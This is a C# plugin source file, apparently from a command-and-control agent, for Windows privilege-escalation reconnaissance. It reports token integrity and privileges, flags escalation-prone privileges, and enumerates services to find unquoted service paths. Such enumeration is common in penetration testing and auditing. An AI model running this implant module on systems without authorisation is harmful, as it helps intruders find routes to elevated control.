using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "privesc";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<privesc.PrivescArgs>(
                    job.task.parameters) ?? new privesc.PrivescArgs();

                string result = args.action switch
                {
                    "privcheck" => CheckPrivileges(),
                    "service-enum" => EnumServices(),
                    _ => throw new ArgumentException(
                        $"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private string CheckPrivileges()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "Privilege check is only available on Windows";

            var sb = new StringBuilder();

            if (!PrivescNative.OpenProcessToken(
                    PrivescNative.GetCurrentProcess(),
                    PrivescNative.TOKEN_QUERY, out IntPtr tokenHandle))
                return $"OpenProcessToken failed: {Marshal.GetLastWin32Error()}";

            try
            {
                // Get integrity level
                PrivescNative.GetTokenInformation(
                    tokenHandle, PrivescNative.TokenIntegrityLevel,
                    IntPtr.Zero, 0, out int ilNeeded);

                IntPtr ilPtr = Marshal.AllocHGlobal(ilNeeded);
                try
                {
                    if (PrivescNative.GetTokenInformation(
                            tokenHandle, PrivescNative.TokenIntegrityLevel,
                            ilPtr, ilNeeded, out _))
                    {
                        var label = Marshal.PtrToStructure<
                            PrivescNative.TOKEN_MANDATORY_LABEL>(ilPtr);
                        IntPtr ridPtr = IntPtr.Add(label.Label.Sid,
                            8 + (Marshal.ReadByte(label.Label.Sid, 1) - 1) * 4);
                        int rid = Marshal.ReadInt32(ridPtr);
                        string level = rid switch
                        {
                            0x0000 => "Untrusted",
                            0x1000 => "Low",
                            0x2000 => "Medium",
                            0x2100 => "Medium Plus",
                            0x3000 => "High",
                            0x4000 => "System",
                            _ => $"Unknown (0x{rid:X4})"
                        };
                        sb.AppendLine($"Integrity Level: {level}");
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ilPtr);
                }

                // Get privileges
                PrivescNative.GetTokenInformation(
                    tokenHandle, PrivescNative.TokenPrivileges,
                    IntPtr.Zero, 0, out int tpNeeded);

                IntPtr tpPtr = Marshal.AllocHGlobal(tpNeeded);
                try
                {
                    if (PrivescNative.GetTokenInformation(
                            tokenHandle, PrivescNative.TokenPrivileges,
                            tpPtr, tpNeeded, out _))
                    {
                        uint count = (uint)Marshal.ReadInt32(tpPtr);
                        sb.AppendLine($"\nPrivileges ({count}):");

                        int offset = 4; // after PrivilegeCount
                        for (uint i = 0; i < count; i++)
                        {
                            var laa = Marshal.PtrToStructure<
                                PrivescNative.LUID_AND_ATTRIBUTES>(
                                IntPtr.Add(tpPtr, offset));

                            var nameBuilder = new StringBuilder(256);
                            int nameLen = 256;
                            var luid = laa.Luid;
                            PrivescNative.LookupPrivilegeName(
                                null, ref luid, nameBuilder, ref nameLen);

                            string status = (laa.Attributes &
                                PrivescNative.SE_PRIVILEGE_ENABLED) != 0
                                ? "Enabled" : "Disabled";

                            string name = nameBuilder.ToString();
                            string flag = IsEscalationPrivilege(name)
                                ? " [!]" : "";

                            sb.AppendLine(
                                $"  {name}: {status}{flag}");

                            offset += Marshal.SizeOf<
                                PrivescNative.LUID_AND_ATTRIBUTES>();
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(tpPtr);
                }
            }
            finally
            {
                PrivescNative.CloseHandle(tokenHandle);
            }

            return sb.ToString();
        }

        private static bool IsEscalationPrivilege(string name)
        {
            return name is "SeDebugPrivilege"
                or "SeImpersonatePrivilege"
                or "SeAssignPrimaryTokenPrivilege"
                or "SeTcbPrivilege"
                or "SeBackupPrivilege"
                or "SeRestorePrivilege"
                or "SeTakeOwnershipPrivilege"
                or "SeLoadDriverPrivilege";
        }

        private string EnumServices()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "Service enumeration is only available on Windows";

            IntPtr scManager = PrivescNative.OpenSCManager(
                null, null, PrivescNative.SC_MANAGER_ENUMERATE_SERVICE);
            if (scManager == IntPtr.Zero)
                return $"OpenSCManager failed: {Marshal.GetLastWin32Error()}";

            try
            {
                var sb = new StringBuilder();
                int resumeHandle = 0;

                PrivescNative.EnumServicesStatusEx(
                    scManager, 0, PrivescNative.SERVICE_WIN32,
                    PrivescNative.SERVICE_STATE_ALL,
                    IntPtr.Zero, 0, out int bytesNeeded,
                    out _, ref resumeHandle, null);

                IntPtr buf = Marshal.AllocHGlobal(bytesNeeded);
                try
                {
                    resumeHandle = 0;
                    if (!PrivescNative.EnumServicesStatusEx(
                            scManager, 0, PrivescNative.SERVICE_WIN32,
                            PrivescNative.SERVICE_STATE_ALL,
                            buf, bytesNeeded, out _,
                            out int serviceCount, ref resumeHandle, null))
                        return $"EnumServicesStatusEx failed: {Marshal.GetLastWin32Error()}";

                    int structSize = Marshal.SizeOf<
                        PrivescNative.ENUM_SERVICE_STATUS_PROCESS>();

                    for (int i = 0; i < serviceCount; i++)
                    {
                        IntPtr entryPtr = IntPtr.Add(buf, i * structSize);
                        var entry = Marshal.PtrToStructure<
                            PrivescNative.ENUM_SERVICE_STATUS_PROCESS>(entryPtr);

                        string? serviceName = Marshal.PtrToStringUni(
                            entry.lpServiceName);
                        string? displayName = Marshal.PtrToStringUni(
                            entry.lpDisplayName);

                        string state = entry.dwCurrentState switch
                        {
                            1 => "Stopped",
                            2 => "Start Pending",
                            3 => "Stop Pending",
                            4 => "Running",
                            5 => "Continue Pending",
                            6 => "Pause Pending",
                            7 => "Paused",
                            _ => $"Unknown ({entry.dwCurrentState})"
                        };

                        sb.AppendLine($"{serviceName} ({displayName})");
                        sb.AppendLine($"  State: {state}, PID: {entry.dwProcessId}");

                        // Try to get binary path for unquoted path check
                        IntPtr svcHandle = PrivescNative.OpenService(
                            scManager, serviceName!,
                            PrivescNative.SERVICE_QUERY_CONFIG);
                        if (svcHandle != IntPtr.Zero)
                        {
                            try
                            {
                                PrivescNative.QueryServiceConfig(
                                    svcHandle, IntPtr.Zero, 0,
                                    out int configNeeded);

                                IntPtr configBuf = Marshal.AllocHGlobal(
                                    configNeeded);
                                try
                                {
                                    if (PrivescNative.QueryServiceConfig(
                                            svcHandle, configBuf,
                                            configNeeded, out _))
                                    {
                                        var config = Marshal.PtrToStructure<
                                            PrivescNative.QUERY_SERVICE_CONFIG>(
                                            configBuf);
                                        string? binPath =
                                            Marshal.PtrToStringUni(
                                                config.lpBinaryPathName);
                                        string? startName =
                                            Marshal.PtrToStringUni(
                                                config.lpServiceStartName);

                                        sb.AppendLine($"  Binary: {binPath}");
                                        sb.AppendLine($"  RunAs: {startName}");

                                        if (binPath != null
                                            && !binPath.StartsWith("\"")
                                            && binPath.Contains(' '))
                                        {
                                            sb.AppendLine(
                                                "  [!] UNQUOTED SERVICE PATH");
                                        }
                                    }
                                }
                                finally
                                {
                                    Marshal.FreeHGlobal(configBuf);
                                }
                            }
                            finally
                            {
                                PrivescNative.CloseServiceHandle(svcHandle);
                            }
                        }
                        sb.AppendLine();
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buf);
                }

                return sb.Length == 0
                    ? "No services found"
                    : sb.ToString();
            }
            finally
            {
                PrivescNative.CloseServiceHandle(scManager);
            }
        }
    }
}
